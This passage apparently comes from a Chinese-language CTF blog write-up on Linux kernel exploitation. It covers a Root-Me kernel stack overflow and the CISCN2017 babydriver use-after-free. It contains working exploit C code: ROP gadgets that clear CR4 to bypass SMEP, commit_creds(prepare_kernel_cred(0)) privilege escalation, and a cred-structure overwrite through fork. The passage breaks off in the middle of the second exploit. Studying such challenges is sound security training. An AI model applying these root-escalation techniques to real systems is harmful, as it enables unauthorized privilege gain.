<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译c文件并放入img，启动qemu的脚本second.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -m32 -static -o exp exp.c</span><br><span class="line">cp exp.c initramfs</span><br><span class="line">cp exp initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>3.调试模块基址</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/ch39.ko 0xc8824000 -s .bss 0xc8824440 -s .data 0xc88241a0</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210604203258087.png" alt="image-20210604203258087"></p>
<p>4.启动文件start.sh</p>
<blockquote>
<p>根据隐藏文件改编</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">app-systeme-ch39@challenge03:~$ cat ._start_vm </span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">CHALLPATH=/challenge/app-systeme/ch39</span><br><span class="line"></span><br><span class="line">STTY=$(stty -g)</span><br><span class="line">stty intr ^-</span><br><span class="line"></span><br><span class="line">TEMP=$(mktemp -d)</span><br><span class="line">chgrp app-systeme-ch39 <span class="variable">$&#123;TEMP&#125;</span></span><br><span class="line">chmod 770 <span class="variable">$&#123;TEMP&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"A share will be available: host:<span class="variable">$&#123;TEMP&#125;</span> -&gt; guest:/mnt/share"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Launching the vulnerable machine..."</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line"> -m 32M \</span><br><span class="line"> -cpu kvm64,+smep,check \</span><br><span class="line"> -nographic \</span><br><span class="line"> -kernel <span class="variable">$CHALLPATH</span>/bzImage \</span><br><span class="line"> -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1'</span> \</span><br><span class="line"> -monitor /dev/null \</span><br><span class="line"> -initrd <span class="variable">$CHALLPATH</span>/initramfs.img \</span><br><span class="line"> -snapshot \</span><br><span class="line"> -hda <span class="variable">$CHALLPATH</span>/passwd.img \</span><br><span class="line"> -fsdev <span class="built_in">local</span>,id=exp1,path=<span class="variable">$&#123;TEMP&#125;</span>,security_model=mapped -device virtio-9p-pci,fsdev=exp1,mount_tag=rootme</span><br><span class="line"></span><br><span class="line">rm -rf <span class="string">"<span class="variable">$&#123;TEMP&#125;</span>"</span> 2&gt; /dev/null</span><br><span class="line">stty <span class="string">"<span class="variable">$&#123;STTY&#125;</span>"</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;basicrop \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>可以看到开启了smep保护，即不能内核态不能执行用户态代码。</p>
<p><img src="/2021/06/05/20-29/image-20210604204333432.png" alt="image-20210604204333432"></p>
<h4 id="分析init文件-1"><a href="#分析init文件-1" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/bof</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</p>
<h4 id="分析LKMs文件-2"><a href="#分析LKMs文件-2" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ file ch39.ko </span><br><span class="line">ch39.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=c713ac86971c4a5d343a2537a18a950af493c44d, not stripped</span><br><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ checksec ch39.ko </span><br><span class="line">[*] '/home/winter/basicrop/initramfs/lib/modules/4.10.3/rootme/ch39.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>这次没有源码，主要分析ida中的ko文件</p>
<p><img src="/2021/06/05/20-29/image-20210604230215674.png" alt="image-20210604230215674"></p>
<p>主要分析write函数</p>
<ol>
<li>判断size不为0</li>
<li>将Buf里的长度len的数据循环拷贝到栈上长度0x24的栈上</li>
<li>…</li>
</ol>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>因为存在栈溢出，所以如果填充40个垃圾数据后，就可以覆盖到eip了</p>
<h5 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h5><blockquote>
<p>cyclic 40=&gt;生成40个字符</p>
<p>然后返回地址填成0xdeadbeef</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210604210532727.png" alt="image-20210604210532727"></p>
<p><img src="/2021/06/05/20-29/image-20210604210519934.png" alt="image-20210604210519934"></p>
<p><img src="/2021/06/05/20-29/image-20210605000529882.png" alt="image-20210605000529882"></p>
<p>正如我们所想，eip的值为0xdeadbeef然后就挂了。</p>
<p>可以成功控制eip</p>
<h5 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h5><p>要绕过smep检验，将cr4的第20位设为0，通过两个gadget实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xc10174fc : pop eax ; ret</span><br><span class="line">0xc1045053 : mov cr4, eax ; pop ebp ; ret</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210605000952674.png" alt="image-20210605000952674"></p>
<p>在test2的c后面加上提权的shellcode，即可得到最后的exp</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    *((<span class="keyword">void</span>**)(Get_shell)) = &amp;payload;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">56</span>;i &lt; <span class="number">4</span>;i++,j++)&#123;</span><br><span class="line">        Payload[j] = Get_shell[i];<span class="comment">//绕过smep后加上提权和get shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210605001430795.png" alt="image-20210605001430795"></p>
<h3 id="4-CISCN2017-–-babydriver"><a href="#4-CISCN2017-–-babydriver" class="headerlink" title="4.CISCN2017 – babydriver"></a>4.CISCN2017 – babydriver</h3><h4 id="下载文件-3"><a href="#下载文件-3" class="headerlink" title="下载文件"></a>下载文件</h4><p>wiki中有这道，可以上github的ctf-challenge中下载</p>
<p><a href="babydriver.tar">附件</a></p>
<p>一共给了三个文件：boot.sh、bzImage和rootfs.cpio</p>
<ul>
<li><p>boot.sh：是启动文件，开启了kvm（虚拟化），但虚拟机中的Ubuntu再启动虚拟化很麻烦，因此可以直接修改启动指令为如下指令，启动脚本start.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
</li>
<li><p>bzImage：未压缩的文件系统</p>
</li>
<li><p>rootfs.cpio：内核镜像</p>
</li>
</ul>
<h4 id="预备-1"><a href="#预备-1" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压内核镜像脚本，decompression.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">cpio -idvm &lt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译c文件并放入img，启动qemu的脚本input_file.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -static -o exp exp.c</span><br><span class="line">cp exp.c rootfs</span><br><span class="line">cp exp rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>调试模块基址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">add-symbol-file ./rootfs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000 -s .bss 0xffffffffc0002000 -s .data 0xffffffffc0002440</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210605202802017.png" alt="image-20210605202802017"></p>
</li>
<li><p>启动文件start.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>开启了smep保护</p>
<p><img src="/2021/06/05/20-29/image-20210605204630220.png" alt="image-20210605204630220"></p>
</li>
<li><p>提权地址</p>
<p><img src="/2021/06/05/20-29/image-20210605205107457.png" alt="image-20210605205107457"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1420</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>LKMs文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/babydriver$ cd rootfs/lib/modules/4.4.72/</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ ls</span><br><span class="line">babydriver.ko</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ file babydriver.ko </span><br><span class="line">babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ checksec babydriver.ko </span><br><span class="line">[*] '/home/winter/babydriver/rootfs/lib/modules/4.4.72/babydriver.ko'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>64位的</p>
</li>
</ol>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="init"><a href="#init" class="headerlink" title="init"></a>init</h5><blockquote>
<p>看看即可</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<h5 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h5><p><img src="/2021/06/05/20-29/image-20210605210915873.png" alt="image-20210605210915873"></p>
<p>本题提供了五个函数</p>
<ol>
<li><p>open</p>
<p><img src="/2021/06/05/20-29/image-20210605211023321.png" alt="image-20210605211023321"></p>
<p>打开设备时，程序申请一个64字节的chunk给全局变量device_buf，并且将size赋值给device_buf_size</p>
</li>
<li><p>write</p>
<p><img src="/2021/06/05/20-29/image-20210605211737963.png" alt="image-20210605211737963"></p>
<ol>
<li>首先看device_buf是否分配了chunk，device_buf_len&gt;要写入的长度</li>
<li>通过copy_from_user拷贝数据，因为是将rsi的数据拷贝到rdi，也就是将buffer里的数据拷贝到device_buf</li>
</ol>
</li>
<li><p>read</p>
<p>与write类似</p>
</li>
<li><p>release</p>
<p><img src="/2021/06/05/20-29/image-20210605212036394.png" alt="image-20210605212036394"></p>
<p>释放device_buf指向的chunk，但没有置零【UAF】</p>
</li>
<li><p>ioctl</p>
<p><img src="/2021/06/05/20-29/image-20210605212140400.png" alt="image-20210605212140400"></p>
<ol>
<li>esi的值位0x10001</li>
<li>释放device_buf</li>
<li>并且申请一个用户传入的size重新分配chunk【v4=v3=rdx】</li>
<li>然后将size赋值给device_buf_len</li>
</ol>
</li>
</ol>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>因为open申请的时候，是将地址赋值给一个全局变量<code>babydev_struct.device_buf</code>，且程序将操作结果赋值给给该变量。</p>
<ol>
<li><p>申请两个设备，那么将分配两个设备描述符</p>
<blockquote>
<p>注意，申请多个设备，对他们的操作应该是独立的，但是本题中由于将结果都赋值到一个全局变量中，导致多个设备之间底层使用的是同一个地址。</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606152944747.png" alt="image-20210606152944747"></p>
<p>由于程序将结果保存再一个全局变量中，故对两个设备的操作，本质上是对同一地址操作</p>
<ul>
<li>申请fd1，会申请一块空间，并赋值给了<code>babydev_struct.device_buf</code></li>
<li>再次申请fd2，同一会再次申请一块空间，覆盖<code>babydev_struct.device_buf</code>里原来的值</li>
</ul>
</li>
<li><p>ioctl fd1，将全局变量的chunk大小变为cred结构题一样大</p>
<p><code>babydev_struct.device_buf=新申请的0xa8的地址</code></p>
</li>
<li><p>close fd1，释放了fd1，即释放了<code>babydev_struct.device_buf</code>，由于fd1和fd2指向同一地址，故fd2指向了一块以释放内存</p>
</li>
<li><p>fork，将一个进程分裂出一个子进程【父进程将与子进程共享内存空间】</p>
<p>子进程被创建时将创建对应的<code>struct cred</code> =&gt; <code>babydev_struct.device_buf</code>指向的已释放的内存分配走</p>
</li>
<li><p>通过fd2修改内容，就是修改4中子进程的cred，则提权成功！</p>
</li>
</ol>
<h5 id="调试信息-2"><a href="#调试信息-2" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/20-29/image-20210606140816472.png" alt="image-20210606140816472"></p>
<p>根据调试信息对比ida可以看出，0xffffffffc00024d0地址就是babydev_struct.device_buf</p>
<blockquote>
<p>尚未初始化的时候，值为0</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606144728288.png" alt="image-20210606144728288"></p>
<blockquote>
<p>第一次申请设备</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606144740804.png" alt="image-20210606144740804"></p>
<blockquote>
<p>第二次申请设备</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606144750687.png" alt="image-20210606144750687"></p>
<blockquote>
<p>ioctl，修改设备1chunk的大小为cred_size</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606144805046.png" alt="image-20210606144805046"></p>
<blockquote>
<p>释放设备1，此时设备2的device_buf将指向一块以释放内存</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606144818089.png" alt="image-20210606144818089"></p>
<blockquote>
<p>cred结构体的前28个字节都被设置为0（包括uid、gid）</p>
</blockquote>
<p><img src="/2021/06/05/20-29/image-20210606144822285.png" alt="image-20210606144822285"></p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//申请两个设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1:%d\n"</span>,fd1);<span class="comment">//文件描述符3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd2:%d\n"</span>,fd2);<span class="comment">//文件描述符4</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 